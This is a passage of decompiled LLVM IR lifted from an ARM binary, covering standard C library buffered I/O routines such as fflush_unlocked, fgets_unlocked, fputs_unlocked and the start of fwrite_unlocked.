dec_label_pc_14d10.dec_label_pc_14d1c_crit_edge:  ; preds = %dec_label_pc_14d0c
  %v0_14d28.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14d1c

dec_label_pc_14d1c:                               ; preds = %dec_label_pc_14d10.dec_label_pc_14d1c_crit_edge, %dec_label_pc_14c94
  %v0_14d28 = phi i32 [ %v0_14d28.pre, %dec_label_pc_14d10.dec_label_pc_14d1c_crit_edge ], [ %v0_14cc0, %dec_label_pc_14c94 ]
  store i32 24, i32* %r3.global-to-local, align 4
  %v2_14d28 = add i32 %v0_14d28, 24
  %v3_14d28 = inttoptr i32 %v2_14d28 to i32*
  %v4_14d28 = load i32, i32* %v3_14d28, align 4
  call void @__pseudo_branch(i32 %v4_14d28)
  store i32 52, i32* %r3.global-to-local, align 4
  %v0_14d38 = load i32, i32* %r6.global-to-local, align 4
  %v2_14d38 = add i32 %v0_14d38, 52
  %v3_14d38 = inttoptr i32 %v2_14d38 to i32*
  %v4_14d38 = load i32, i32* %v3_14d38, align 4
  store i32 %v4_14d38, i32* %r3.global-to-local, align 4
  %v0_14d3c = load i32, i32* %r4.global-to-local, align 4
  %v2_14d3c = inttoptr i32 %v4_14d38 to i32*
  store i32 %v0_14d3c, i32* %v2_14d3c, align 4
  %v0_14d44.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14d40

dec_label_pc_14d40:                               ; preds = %entry, %dec_label_pc_14c80, %dec_label_pc_14d1c
  %v0_14d44 = phi i32 [ %v0_14c70, %entry ], [ %v0_14c70, %dec_label_pc_14c80 ], [ %v0_14d44.pre, %dec_label_pc_14d1c ]
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_14d44 = add i32 %v0_14d44, 12
  %v3_14d44 = inttoptr i32 %v2_14d44 to i32*
  %v4_14d44 = load i32, i32* %v3_14d44, align 4
  %v1_14d48 = inttoptr i32 %v4_14d44 to i32*
  %v2_14d48 = load i32, i32* %v1_14d48, align 4
  %v1_14d4c = add i32 %v2_14d48, -1
  store i32 %v1_14d4c, i32* %v1_14d48, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_14d60 = load i32, i32* %r6.global-to-local, align 4
  %v2_14d60 = add i32 %v0_14d60, 24
  %v3_14d60 = inttoptr i32 %v2_14d60 to i32*
  %v4_14d60 = load i32, i32* %v3_14d60, align 4
  store i32 %v4_14d60, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_14d60)
  %v2_14d70 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_14d70, i32* %r4.global-to-local, align 4
  ret i32 %v2_14c4c

; uselistorder directives
  uselistorder i32 %v0_14d0c, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r6.global-to-local, { 2, 1, 3, 0, 4, 5, 6, 7, 8 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 20, 21, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder label %dec_label_pc_14d40, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14d0c, { 1, 0 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %dec_label_pc_14cd4, { 1, 0 }
}

define i32 @function_14d7c(i32 %arg1) local_unnamed_addr {
dec_label_pc_14d7c:
  %v0_14d7c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14d7c, label %bb, label %.thread8

bb:                                               ; preds = %dec_label_pc_14d7c
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_14d7c, %bb
  %v10_14da0 = phi i32 [ %arg1, %dec_label_pc_14d7c ], [ 0, %bb ]
  ret i32 %v10_14da0

; uselistorder directives
  uselistorder label %.thread8, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-72 = alloca i32, align 4
  store i32 48, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %sb.global-to-local, align 4
  %v4_14db4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 48) to i32*), align 4
  store i32 %v4_14db4, i32* %r3.global-to-local, align 4
  %v10_14db8 = icmp eq i32 %tmp, %v4_14db4
  store i32 %tmp, i32* %fp.global-to-local, align 4
  br i1 %v10_14db8, label %bb, label %dec_label_pc_14dd0

bb:                                               ; preds = %entry
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_14de0

dec_label_pc_14dd0:                               ; preds = %entry
  store i32 256, i32* %r2.global-to-local, align 4
  %v2_14dd4 = icmp eq i16* %arg1, null
  br i1 %v2_14dd4, label %dec_label_pc_14de0, label %dec_label_pc_14f48

dec_label_pc_14de0:                               ; preds = %bb, %dec_label_pc_14dd0
  %stack_var_-60.1.in = phi i32 [ 0, %bb ], [ 256, %dec_label_pc_14dd0 ]
  store i32 112, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_14df4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 112) to i32*), align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_14e00 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 76) to i32*), align 4
  store i32 16, i32* %stack_var_-72, align 4
  store i32 %v4_14df4, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14e00)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_14e24 = load i32, i32* %sb.global-to-local, align 4
  %v2_14e24 = add i32 %v0_14e24, 16
  %v3_14e24 = inttoptr i32 %v2_14e24 to i32*
  %v4_14e24 = load i32, i32* %v3_14e24, align 4
  call void @__pseudo_branch(i32 %v4_14e24)
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_14e34 = add i32 %v0_14e24, 12
  %v3_14e34 = inttoptr i32 %v2_14e34 to i32*
  %v4_14e34 = load i32, i32* %v3_14e34, align 4
  store i32 %v4_14e34, i32* %r2.global-to-local, align 4
  %v1_14e38 = inttoptr i32 %v4_14e34 to i32*
  %v2_14e38 = load i32, i32* %v1_14e38, align 4
  store i32 24, i32* %sl.global-to-local, align 4
  %v1_14e40 = add i32 %v2_14e38, 1
  store i32 %v1_14e40, i32* %r3.global-to-local, align 4
  %v2_14e44 = add i32 %v0_14e24, 24
  %v3_14e44 = inttoptr i32 %v2_14e44 to i32*
  %v4_14e44 = load i32, i32* %v3_14e44, align 4
  store i32 %v1_14e40, i32* %v1_14e38, align 4
  call void @__pseudo_branch(i32 %v4_14e44)
  store i32 100, i32* %r3.global-to-local, align 4
  %v0_14e60 = load i32, i32* %sb.global-to-local, align 4
  %v2_14e60 = add i32 %v0_14e60, 100
  %v3_14e60 = inttoptr i32 %v2_14e60 to i32*
  %v4_14e60 = load i32, i32* %v3_14e60, align 4
  store i32 %v4_14e60, i32* @r4, align 4
  store i32 %v4_14e60, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14e00)
  call void @__pseudo_branch(i32 %v4_14e24)
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_14e88 = load i32, i32* %sb.global-to-local, align 4
  %v2_14e88 = add i32 %v0_14e88, 48
  %v3_14e88 = inttoptr i32 %v2_14e88 to i32*
  %v4_14e88 = load i32, i32* %v3_14e88, align 4
  store i32 %v4_14e88, i32* %r3.global-to-local, align 4
  %v1_14e94 = inttoptr i32 %v4_14e88 to i32*
  %v2_14e94 = load i32, i32* %v1_14e94, align 4
  store i32 %v2_14e94, i32* @r7, align 4
  call void @__pseudo_branch(i32 %v4_14e44)
  %v0_14ea0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_14ea0, i32* @r6, align 4
  %v2_14ea4 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_14ea4, i32* @r8, align 4
  store i32 76, i32* %fp.global-to-local, align 4
  %v0_14f38.pr = load i32, i32* @r7, align 4
  %v2_14f3819 = icmp eq i32 %v0_14f38.pr, 0
  br i1 %v2_14f3819, label %dec_label_pc_14f40, label %dec_label_pc_14eac

dec_label_pc_14eac:                               ; preds = %dec_label_pc_14de0, %dec_label_pc_14f34
  %v0_14eb8 = phi i32 [ %v3_14f34, %dec_label_pc_14f34 ], [ %v0_14f38.pr, %dec_label_pc_14de0 ]
  %v1_14eac = inttoptr i32 %v0_14eb8 to i16*
  %v2_14eac = load i16, i16* %v1_14eac, align 2
  %v3_14eac = zext i16 %v2_14eac to i32
  store i32 %v3_14eac, i32* %r3.global-to-local, align 4
  %v1_14eb0 = and i32 %v3_14eac, 64
  %v2_14eb0 = icmp eq i32 %v1_14eb0, 0
  br i1 %v2_14eb0, label %dec_label_pc_14f34, label %dec_label_pc_14eb8

dec_label_pc_14eb8:                               ; preds = %dec_label_pc_14eac
  %v1_14eb8 = add i32 %v0_14eb8, 56
  store i32 %v1_14eb8, i32* @r4, align 4
  store i32 %v1_14eb8, i32* %r2.global-to-local, align 4
  %v0_14ec8 = load i32, i32* %sb.global-to-local, align 4
  %v1_14ec8 = load i32, i32* %fp.global-to-local, align 4
  %v2_14ec8 = add i32 %v1_14ec8, %v0_14ec8
  %v3_14ec8 = inttoptr i32 %v2_14ec8 to i32*
  %v4_14ec8 = load i32, i32* %v3_14ec8, align 4
  call void @__pseudo_branch(i32 %v4_14ec8)
  %v1_14ed8 = load i32, i32* @r8, align 4
  %v2_14ed8 = add i32 %v1_14ed8, %v0_14ec8
  %v3_14ed8 = inttoptr i32 %v2_14ed8 to i32*
  %v4_14ed8 = load i32, i32* %v3_14ed8, align 4
  call void @__pseudo_branch(i32 %v4_14ed8)
  %v0_14ee4 = load i32, i32* @r7, align 4
  %v1_14ee4 = inttoptr i32 %v0_14ee4 to i16*
  %v2_14ee4 = load i16, i16* %v1_14ee4, align 2
  %v3_14ee4 = zext i16 %v2_14ee4 to i32
  store i32 %stack_var_-60.1.in, i32* %r2.global-to-local, align 4
  %v2_14eec = or i32 %v3_14ee4, %stack_var_-60.1.in
  %v1_14ef0 = xor i32 %v2_14eec, 320
  store i32 %v1_14ef0, i32* %r3.global-to-local, align 4
  %v1_14ef4 = and i32 %v1_14ef0, 832
  %v2_14ef4 = icmp eq i32 %v1_14ef4, 0
  br i1 %v2_14ef4, label %dec_label_pc_14efc, label %bb38

dec_label_pc_14efc:                               ; preds = %dec_label_pc_14eb8
  store i32 %v0_14ee4, i32* @r0, align 4
  %v0_14f00 = call i32 @__stdio_wcommit()
  %v2_14f04 = icmp eq i32 %v0_14f00, 0
  br i1 %v2_14f04, label %.thread7, label %.thread8

.thread7:                                         ; preds = %dec_label_pc_14efc
  %v1_14f08 = load i32, i32* @r7, align 4
  %v2_14f08 = inttoptr i32 %v1_14f08 to i16*
  %v3_14f08 = load i16, i16* %v2_14f08, align 2
  %v4_14f08 = zext i16 %v3_14f08 to i32
  store i32 %v4_14f08, i32* %r3.global-to-local, align 4
  %v2_14f0c = add i32 %v1_14f08, 8
  %v3_14f0c = inttoptr i32 %v2_14f0c to i32*
  %v4_14f0c = load i32, i32* %v3_14f0c, align 4
  store i32 %v4_14f0c, i32* %r2.global-to-local, align 4
  %v2_14f10 = and i32 %v4_14f08, 65471
  store i32 %v2_14f10, i32* %r3.global-to-local, align 4
  %v3_14f14 = add i32 %v1_14f08, 28
  %v4_14f14 = inttoptr i32 %v3_14f14 to i32*
  store i32 %v4_14f0c, i32* %v4_14f14, align 4
  %v1_14f18 = load i32, i32* %r3.global-to-local, align 4
  %v2_14f18 = trunc i32 %v1_14f18 to i16
  %v3_14f18 = load i32, i32* @r7, align 4
  %v4_14f18 = inttoptr i32 %v3_14f18 to i16*
  store i16 %v2_14f18, i16* %v4_14f18, align 2
  br label %bb38

.thread8:                                         ; preds = %dec_label_pc_14efc
  store i32 -1, i32* @r6, align 4
  br label %bb38

bb38:                                             ; preds = %.thread7, %dec_label_pc_14eb8, %.thread8
  %v0_14f28 = load i32, i32* %sb.global-to-local, align 4
  %v1_14f28 = load i32, i32* %sl.global-to-local, align 4
  %v2_14f28 = add i32 %v1_14f28, %v0_14f28
  %v3_14f28 = inttoptr i32 %v2_14f28 to i32*
  %v4_14f28 = load i32, i32* %v3_14f28, align 4
  call void @__pseudo_branch(i32 %v4_14f28)
  %v0_14f34.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_14f34

dec_label_pc_14f34:                               ; preds = %dec_label_pc_14eac, %bb38
  %v0_14f34 = phi i32 [ %v0_14eb8, %dec_label_pc_14eac ], [ %v0_14f34.pre, %bb38 ]
  %v1_14f34 = add i32 %v0_14f34, 32
  %v2_14f34 = inttoptr i32 %v1_14f34 to i32*
  %v3_14f34 = load i32, i32* %v2_14f34, align 4
  store i32 %v3_14f34, i32* @r7, align 4
  %v2_14f38 = icmp eq i32 %v3_14f34, 0
  br i1 %v2_14f38, label %dec_label_pc_14f40, label %dec_label_pc_14eac

dec_label_pc_14f40:                               ; preds = %dec_label_pc_14f34, %dec_label_pc_14de0
  %v0_14f40 = call i32 @_stdio_openlist_dec_use()
  %v0_14f7c.pre = load i32, i32* @r6, align 4
  br label %bb40

dec_label_pc_14f48:                               ; preds = %dec_label_pc_14dd0
  %v2_14f48 = load i16, i16* %arg1, align 2
  %v3_14f48 = zext i16 %v2_14f48 to i32
  %v1_14f4c = and i32 %v3_14f48, 64
  store i32 %v1_14f4c, i32* %r3.global-to-local, align 4
  %v2_14f4c = icmp eq i32 %v1_14f4c, 0
  br i1 %v2_14f4c, label %bb39, label %dec_label_pc_14f58

bb39:                                             ; preds = %dec_label_pc_14f48
  br label %bb40

dec_label_pc_14f58:                               ; preds = %dec_label_pc_14f48
  %v0_14f58 = call i32 @__stdio_wcommit()
  %v2_14f5c = icmp eq i32 %v0_14f58, 0
  br i1 %v2_14f5c, label %.thread15, label %.thread17

.thread17:                                        ; preds = %dec_label_pc_14f58
  br label %bb40

.thread15:                                        ; preds = %dec_label_pc_14f58
  %v1_14f60 = load i32, i32* %fp.global-to-local, align 4
  %v2_14f60 = inttoptr i32 %v1_14f60 to i16*
  %v3_14f60 = load i16, i16* %v2_14f60, align 2
  %v4_14f60 = zext i16 %v3_14f60 to i32
  store i32 %v4_14f60, i32* %r3.global-to-local, align 4
  %v2_14f64 = add i32 %v1_14f60, 8
  %v3_14f64 = inttoptr i32 %v2_14f64 to i32*
  %v4_14f64 = load i32, i32* %v3_14f64, align 4
  store i32 %v4_14f64, i32* %r2.global-to-local, align 4
  %v2_14f68 = and i32 %v4_14f60, 65471
  store i32 %v2_14f68, i32* %r3.global-to-local, align 4
  %v2_14f6c = trunc i32 %v2_14f68 to i16
  store i16 %v2_14f6c, i16* %v2_14f60, align 2
  %v1_14f70 = load i32, i32* %r2.global-to-local, align 4
  %v2_14f70 = load i32, i32* %fp.global-to-local, align 4
  %v3_14f70 = add i32 %v2_14f70, 28
  %v4_14f70 = inttoptr i32 %v3_14f70 to i32*
  store i32 %v1_14f70, i32* %v4_14f70, align 4
  br label %bb40

bb40:                                             ; preds = %bb39, %.thread17, %dec_label_pc_14f40, %.thread15
  %v0_14f7c = phi i32 [ -1, %.thread17 ], [ 0, %bb39 ], [ %v0_14f7c.pre, %dec_label_pc_14f40 ], [ 0, %.thread15 ]
  ret i32 %v0_14f7c

; uselistorder directives
  uselistorder i32 %v3_14f34, { 1, 2, 0 }
  uselistorder i32 %v0_14e24, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 112) to i32*), { 1, 2, 0 }
  uselistorder label %bb40, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_14f34, { 1, 0 }
  uselistorder label %bb38, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14eac, { 1, 0 }
  uselistorder label %dec_label_pc_14de0, { 1, 0 }
}

define i32 @function_14f90(i32 %arg1) local_unnamed_addr {
dec_label_pc_14f90:
  %v0_14f90 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14f90, label %bb, label %.thread6

bb:                                               ; preds = %dec_label_pc_14f90
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_14f90, %bb
  %v5_14fac = phi i32 [ %arg1, %dec_label_pc_14f90 ], [ 0, %bb ]
  ret i32 %v5_14fac

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v6_14fb0 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14fb4 = icmp eq i32 %arg2, 0
  store i1 %v2_14fb4, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_1503c, label %dec_label_pc_15024.preheader

dec_label_pc_15024.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r5, align 4
  %v1_150242 = add i32 %arg2, -1
  store i32 %v1_150242, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_150248 = icmp eq i32 %arg2, 1
  store i1 %v7_150248, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_150248, label %dec_label_pc_1502c, label %dec_label_pc_14fd0

dec_label_pc_14fd0:                               ; preds = %dec_label_pc_15024.preheader, %dec_label_pc_15024.backedge.dec_label_pc_14fd0_crit_edge
  %v0_14ff4 = phi i32 [ %v0_14fd0.pre, %dec_label_pc_15024.backedge.dec_label_pc_14fd0_crit_edge ], [ %arg3, %dec_label_pc_15024.preheader ]
  %v1_14fd0 = add i32 %v0_14ff4, 16
  %v2_14fd0 = inttoptr i32 %v1_14fd0 to i32*
  %v3_14fd0 = load i32, i32* %v2_14fd0, align 4
  store i32 %v3_14fd0, i32* %r2.global-to-local, align 4
  %v1_14fd4 = add i32 %v0_14ff4, 24
  %v2_14fd4 = inttoptr i32 %v1_14fd4 to i32*
  %v3_14fd4 = load i32, i32* %v2_14fd4, align 4
  store i32 %v3_14fd4, i32* %r3.global-to-local, align 4
  %v3_14fd8 = icmp uge i32 %v3_14fd0, %v3_14fd4
  store i1 %v3_14fd8, i1* %cpsr_c.global-to-local, align 1
  %v9_14fd8 = icmp eq i32 %v3_14fd0, %v3_14fd4
  store i1 %v9_14fd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14fd8, label %dec_label_pc_14ff4, label %dec_label_pc_14fe0

dec_label_pc_14fe0:                               ; preds = %dec_label_pc_14fd0
  %v1_14fe0 = inttoptr i32 %v3_14fd0 to i8*
  %v2_14fe0 = load i8, i8* %v1_14fe0, align 1
  %v3_14fe0 = zext i8 %v2_14fe0 to i32
  store i32 %v3_14fe0, i32* %r3.global-to-local, align 4
  %v5_14fe0 = add i32 %v3_14fd0, 1
  store i32 %v5_14fe0, i32* %r2.global-to-local, align 4
  %v2_14fe4 = load i32, i32* @r5, align 4
  %v3_14fe4 = inttoptr i32 %v2_14fe4 to i8*
  store i8 %v2_14fe0, i8* %v3_14fe4, align 1
  %v4_14fe4 = load i32, i32* @r5, align 4
  %v5_14fe4 = add i32 %v4_14fe4, 1
  store i32 %v5_14fe4, i32* @r5, align 4
  %v0_14fe8 = load i32, i32* %r3.global-to-local, align 4
  %v2_14fe8 = icmp ugt i32 %v0_14fe8, 9
  store i1 %v2_14fe8, i1* %cpsr_c.global-to-local, align 1
  %v7_14fe8 = icmp eq i32 %v0_14fe8, 10
  store i1 %v7_14fe8, i1* %cpsr_z.global-to-local, align 1
  %v0_14fec = load i32, i32* %r2.global-to-local, align 4
  %v1_14fec = load i32, i32* @r4, align 4
  %v2_14fec = add i32 %v1_14fec, 16
  %v3_14fec = inttoptr i32 %v2_14fec to i32*
  store i32 %v0_14fec, i32* %v3_14fec, align 4
  br i1 %v7_14fe8, label %dec_label_pc_1502c, label %dec_label_pc_15024.backedge

dec_label_pc_14ff4:                               ; preds = %dec_label_pc_14fd0
  %v1_14ff4 = inttoptr i32 %v0_14ff4 to i16*
  %v3_14ff8 = call i32 @getc_unlocked(i16* %v1_14ff4)
  %v3_14ffc = icmp eq i32 %v3_14ff8, -1
  store i1 %v3_14ffc, i1* %cpsr_c.global-to-local, align 1
  %v8_14ffc = icmp eq i32 %v3_14ff8, -1
  store i1 %v8_14ffc, i1* %cpsr_z.global-to-local, align 1
  %v1_15000 = urem i32 %v3_14ff8, 256
  store i32 %v1_15000, i32* %r3.global-to-local, align 4
  br i1 %v3_14ffc, label %dec_label_pc_15008, label %dec_label_pc_15020

dec_label_pc_15008:                               ; preds = %dec_label_pc_14ff4
  %v0_15008 = load i32, i32* @r4, align 4
  %v1_15008 = inttoptr i32 %v0_15008 to i16*
  %v2_15008 = load i16, i16* %v1_15008, align 2
  %v3_15008 = zext i16 %v2_15008 to i32
  store i32 %v3_15008, i32* %r3.global-to-local, align 4
  %v1_1500c = and i32 %v3_15008, 8
  %v2_1500c = icmp eq i32 %v1_1500c, 0
  store i1 %v2_1500c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1500c, label %dec_label_pc_1502c, label %dec_label_pc_1503c

dec_label_pc_15020:                               ; preds = %dec_label_pc_14ff4
  %v1_15018 = trunc i32 %v3_14ff8 to i8
  %v2_15018 = load i32, i32* @r5, align 4
  %v3_15018 = inttoptr i32 %v2_15018 to i8*
  store i8 %v1_15018, i8* %v3_15018, align 1
  %v4_15018 = load i32, i32* @r5, align 4
  %v5_15018 = add i32 %v4_15018, 1
  store i32 %v5_15018, i32* @r5, align 4
  %v0_1501c = load i32, i32* %r3.global-to-local, align 4
  %v2_1501c = icmp ugt i32 %v0_1501c, 9
  store i1 %v2_1501c, i1* %cpsr_c.global-to-local, align 1
  %v7_1501c = icmp eq i32 %v0_1501c, 10
  store i1 %v7_1501c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1501c, label %dec_label_pc_1502c, label %dec_label_pc_15024.backedge

dec_label_pc_15024.backedge:                      ; preds = %dec_label_pc_15020, %dec_label_pc_14fe0
  %v0_15024 = load i32, i32* %r6.global-to-local, align 4
  %v1_15024 = add i32 %v0_15024, -1
  store i32 %v1_15024, i32* %r6.global-to-local, align 4
  %v2_15024 = icmp ne i32 %v0_15024, 0
  store i1 %v2_15024, i1* %cpsr_c.global-to-local, align 1
  %v7_15024 = icmp eq i32 %v0_15024, 1
  store i1 %v7_15024, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15024, label %dec_label_pc_1502c, label %dec_label_pc_15024.backedge.dec_label_pc_14fd0_crit_edge

dec_label_pc_15024.backedge.dec_label_pc_14fd0_crit_edge: ; preds = %dec_label_pc_15024.backedge
  %v0_14fd0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14fd0

dec_label_pc_1502c:                               ; preds = %dec_label_pc_15020, %dec_label_pc_15024.backedge, %dec_label_pc_14fe0, %dec_label_pc_15024.preheader, %dec_label_pc_15008
  %v0_1502c = load i32, i32* @r5, align 4
  %v1_1502c = load i32, i32* @r7, align 4
  %v3_1502c = icmp uge i32 %v0_1502c, %v1_1502c
  store i1 %v3_1502c, i1* %cpsr_c.global-to-local, align 1
  %v9_1502c = icmp eq i32 %v0_1502c, %v1_1502c
  store i1 %v9_1502c, i1* %cpsr_z.global-to-local, align 1
  %v2_15030 = xor i1 %v9_1502c, true
  %v3_15030 = and i1 %v3_1502c, %v2_15030
  br i1 %v3_15030, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_1502c
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_15034 = inttoptr i32 %v0_1502c to i8*
  store i8 0, i8* %v7_15034, align 1
  %v0_15038.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_15038.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_1502c, %bb
  %v1_15038 = phi i1 [ %v1_15038.pre, %bb ], [ %v9_1502c, %dec_label_pc_1502c ]
  %v0_15038 = phi i1 [ %v0_15038.pre, %bb ], [ %v3_1502c, %dec_label_pc_1502c ]
  %v2_15038 = xor i1 %v1_15038, true
  %v3_15038 = and i1 %v0_15038, %v2_15038
  br i1 %v3_15038, label %.dec_label_pc_15040_crit_edge, label %dec_label_pc_1503c

.dec_label_pc_15040_crit_edge:                    ; preds = %.thread14
  %v0_15040.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_15040

dec_label_pc_1503c:                               ; preds = %entry, %dec_label_pc_15008, %.thread14
  br label %dec_label_pc_15040

dec_label_pc_15040:                               ; preds = %.dec_label_pc_15040_crit_edge, %dec_label_pc_1503c
  %v0_15040 = phi i32 [ %v0_15040.pre, %.dec_label_pc_15040_crit_edge ], [ 0, %dec_label_pc_1503c ]
  store i32 %v6_14fb0, i32* @r5, align 4
  ret i32 %v0_15040

; uselistorder directives
  uselistorder i1 %v9_1502c, { 1, 0, 2 }
  uselistorder i32 %v1_1502c, { 1, 0 }
  uselistorder i32 %v0_1502c, { 0, 2, 1 }
  uselistorder i32 %v0_15024, { 2, 0, 1 }
  uselistorder i32 %v0_1501c, { 1, 0 }
  uselistorder i32 %v3_14ff8, { 2, 1, 0, 3 }
  uselistorder i32 %v0_14fe8, { 1, 0 }
  uselistorder i32 %v3_14fd0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_14ff4, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 7, 3, 4, 5, 6, 0, 8 }
  uselistorder i32 %arg2, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_15040, { 1, 0 }
  uselistorder label %dec_label_pc_1503c, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_1502c, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_14fd0, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_15050 = load i32, i32* @r4, align 4
  store i32 %v3_15050, i32* %stack_var_-16, align 4
  %v6_15050 = load i32, i32* @r5, align 4
  %v9_15050 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_1505c = call i32 @strlen(i8* %arg1)
  store i32 %v3_1505c, i32* @r6, align 4
  %v0_15064 = load i32, i32* @r5, align 4
  %v0_15068 = load i32, i32* @r4, align 4
  %v5_15074 = inttoptr i32 %v0_15064 to i16*
  %v6_15074 = call i32 @__GI_fwrite_unlocked(i32 %v0_15068, i32 1, i32 %v3_1505c, i16* %v5_15074)
  %v1_15078 = load i32, i32* @r6, align 4
  %v9_15078 = icmp eq i32 %v6_15074, %v1_15078
  br i1 %v9_15078, label %bb7, label %bb

bb:                                               ; preds = %entry
  br label %bb7

bb7:                                              ; preds = %entry, %bb
  %v1_15084 = phi i32 [ %v6_15074, %entry ], [ -1, %bb ]
  %v2_15080 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15080, i32* @r4, align 4
  store i32 %v6_15050, i32* @r5, align 4
  store i32 %v9_15050, i32* @r6, align 4
  ret i32 %v1_15084

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg4 to i32
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v9_15088 = load i32, i32* @r6, align 4
  %v12_15088 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  %v3_15090 = load i16, i16* %arg4, align 2
  %v1_15094 = and i16 %v3_15090, 192
  %v2_15098 = icmp eq i16 %v1_15094, 192
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_15098, label %dec_label_pc_150c4, label %dec_label_pc_150b0

dec_label_pc_150b0:                               ; preds = %entry
  %v4_150b8 = call i32 @__stdio_trans2w_o(i16* nonnull %arg4, i32 128)
